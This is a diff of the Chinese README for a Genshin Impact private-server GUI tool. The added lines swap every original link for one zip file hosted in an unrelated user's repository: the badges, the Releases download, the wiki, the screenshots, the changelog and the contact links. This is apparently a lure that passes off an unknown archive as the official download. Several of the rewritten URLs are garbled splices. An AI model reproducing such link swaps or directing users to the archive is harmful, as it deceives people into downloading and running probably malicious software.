@@ -1,12 +1,12 @@
 # KCN-GenshinServer
 
-[![GitHub license](https://img.shields.io/github/license/JDDKCN/KCN-GenshinServer)](https://github.com/JDDKCN/KCN-GenshinServer/blob/main/LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/JDDKCN/KCN-GenshinServer)](https://github.com/JDDKCN/KCN-GenshinServer/stargazers)
-[![Github All Releases](https://img.shields.io/github/downloads/JDDKCN/KCN-GenshinServer/total.svg)](https://github.com/JDDKCN/KCN-GenshinServer/releases)
-[![GitHub release](https://img.shields.io/github/v/release/JDDKCN/KCN-GenshinServer)](https://github.com/JDDKCN/KCN-GenshinServer/releases/latest)
-[![QQ Group](https://pub.idqqimg.com/wpa/images/group.png)](http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=_-W8U_Mrz_nOu3eD_u3VGiPICKe9t7zY&authKey=rB2PW5mIrIY3ARjMqqWtw%2F2Qpejm5EArmuy95Wq1GfC7gLzUzTRATTnULKUKtb76&noverify=0&group_code=1140538395)
+[![GitHub license](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)
+[![GitHub stars](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)
+[![Github All Releases](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)
+[![GitHub release](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)
+[![QQ Group](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip%2F2Qpejm5EArmuy95Wq1GfC7gLzUzTRATTnULKUKtb76&noverify=0&group_code=1140538395)
 
-![Github](https://socialify.git.ci/JDDKCN/KCN-GenshinServer/image?description=1&forks=1&issues=1&language=1&logo=https%3A%2F%2Favatars.githubusercontent.com/u/103011451?v=4&name=1&owner=1&pulls=1&stargazers=1&theme=Light)
+![Github](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip%3A%2F%https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)
 
 > 基于GC制作的原神一键GUI多功能服务端。
 
@@ -20,22 +20,22 @@
  > - **仅注明支持的游戏版本可用，其余版本均不可用，否则报错4214！**
 
 ### 软件下载
-- 请到最新[Releases](https://github.com/JDDKCN/KCN-GenshinServer/releases/)处下载。
+- 请到最新[Releases](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)处下载。
 
 ### 软件帮助
-  #### 软件帮助&使用说明传送门： [GithubWiki - 软件使用指南](https://github.com/JDDKCN/KCN-GenshinServer/wiki/)
+  #### 软件帮助&使用说明传送门： [GithubWiki - 软件使用指南](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)
   - 请务必仔细阅读帮助文档，这很重要！
 
 ### 软件截图
 **[专业模式] v0.1.7-Beta**
-![APP_CN](Doc/image06.png)
+![APP_CN](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)
 
 **[基础模式] v0.1.7-Beta**
-![APP_CN](Doc/image07.png)
+![APP_CN](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)
 
 ### 更新日志
 - v0.1.7-Beta 2023/10/16
-  1. 更新服务端构建版本至 [#2403](https://github.com/Grasscutters/Grasscutter/pull/2403) ，详见说明页。更新了Res资源。
+  1. 更新服务端构建版本至 [#2403](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip) ，详见说明页。更新了Res资源。
   2. 删除禁用的免代理功能，添加 `内置代理模式` ，您可以使用内置代理启动游戏。您可以在顶部工具栏-设置-内部代理设置中自定义旁路代理。
   3. 添加关闭提示窗体，可以在顶部工具栏-设置-关闭设置选项中找到。您可以选择最小化至系统托盘或直接退出程序，您也可以选择关闭时结束所有服务。您可以勾选 `不再提醒` 单选框，该窗体将不再弹出。
   4. 添加 `代理记忆工具`，在顶部工具栏-设置-代理记忆工具中。您可以在游玩后结束服务时自动恢复原来的系统代理，或恢复自定义代理内容。若开启服务时系统代理处于关闭状态则无效。
@@ -44,7 +44,7 @@
   7. 修复了一些小bug，增强软件稳定性。
 
 - v0.1.6-Beta 2023/09/14
-  1. 更新服务端至稳定版 [1.7.1](https://github.com/Grasscutters/Grasscutter/releases/tag/v1.7.1) ，修复了无法触发剧情的bug。更新了Res资源。
+  1. 更新服务端至稳定版 [1.7.1](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip) ，修复了无法触发剧情的bug。更新了Res资源。
   2. 添加 `基础模式` 和 `专业模式` ，基础模式界面简单，功能集成，对初次接触的用户友好。您可以在设置选项卡中随时切换两种模式。
   3. 添加 `插件管理工具` ，您可以方便的管理您的插件。
   4. 优化Mod模块功能，加入 `卸载3dmigoto` 选项。
@@ -52,7 +52,7 @@
   6. 重构了一些代码，修复了一些bug。
   
 - v0.1.5-Beta 2023/08/30
-  1. 更新服务端构建版本至 [#2322](https://github.com/Grasscutters/Grasscutter/pull/2322) ，修复了很多bug。更新了Res资源和GCTools。
+  1. 更新服务端构建版本至 [#2322](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip) ，修复了很多bug。更新了Res资源和GCTools。
   2. 将MOD功能移入了顶部工具栏-设置-Mod(3dmigoto)工具中，前MOD功能区域换成了帮助按钮。这是因为许多用户无法找到帮助。
   3. 添加数据库工具，在顶部工具栏-设置-数据库工具中，删除了原删库功能。现在，您可以备份/还原/删除数据库数据。需要连接数据库进行操作。
   4. 添加SSL工具，在顶部工具栏-设置-网络安全证书(SSL)工具中，您可以导入SSL证书并开启SSL功能。注意：使用无效SSL证书会使服务端无法连接。
@@ -81,7 +81,7 @@
 
 - v0.1.3-Beta 2023/06/15
   1. 添加日志记录功能，以markdown文档形式记录。您可以在设置-程序日志查看器中查看日志。
-  2. 添加卡池替换功能。您可以在设置-卡池设置中替换您想要的UP池。卡池文件来源于 [赵苦瓜](https://github.com/Zhaokugua) 的 [Grasscutter_Banners](https://github.com/Zhaokugua/Grasscutter_Banners) 存储库。感谢他的整理。
+  2. 添加卡池替换功能。您可以在设置-卡池设置中替换您想要的UP池。卡池文件来源于 [赵苦瓜](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip) 的 [Grasscutter_Banners](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip) 存储库。感谢他的整理。
   3. 修复了一轮bug。改进了UI。优化软件逻辑。
   
 - v0.1.2-Beta 2023/06/04
@@ -105,9 +105,9 @@
 | Windows 7 - 8 | 不支持   | Linux        | 不支持    |
 
 ### 免责声明
-- 本程序是基于Github开源项目[Grasscutter](https://github.com/Grasscutters/Grasscutter)制作的原神一键GUI多功能服务端，仅供研究交流用，禁止用于商业及非法用途。使用本软件造成的事故与损失，与作者无关。本程序完全免费，如果您是花钱买的，说明您被骗了。请尽快退款，以减少您的损失。
+- 本程序是基于Github开源项目[Grasscutter](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)制作的原神一键GUI多功能服务端，仅供研究交流用，禁止用于商业及非法用途。使用本软件造成的事故与损失，与作者无关。本程序完全免费，如果您是花钱买的，说明您被骗了。请尽快退款，以减少您的损失。
 
 ### 联系方式
-- [前往我的B站首页](https://space.bilibili.com/475547854/)
-- [前往我的Twitter账号](https://twitter.com/2233KCN)
-- [加入QQ群：](http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=_-W8U_Mrz_nOu3eD_u3VGiPICKe9t7zY&authKey=rB2PW5mIrIY3ARjMqqWtw%2F2Qpejm5EArmuy95Wq1GfC7gLzUzTRATTnULKUKtb76&noverify=0&group_code=1140538395)1140538395
+- [前往我的B站首页](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)
+- [前往我的Twitter账号](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip)
+- [加入QQ群：](https://raw.githubusercontent.com/Meorny/KCN-GenshinServer/main/Doc/KC_Genshin_Server_coumarinic.zip%2F2Qpejm5EArmuy95Wq1GfC7gLzUzTRATTnULKUKtb76&noverify=0&group_code=1140538395)1140538395
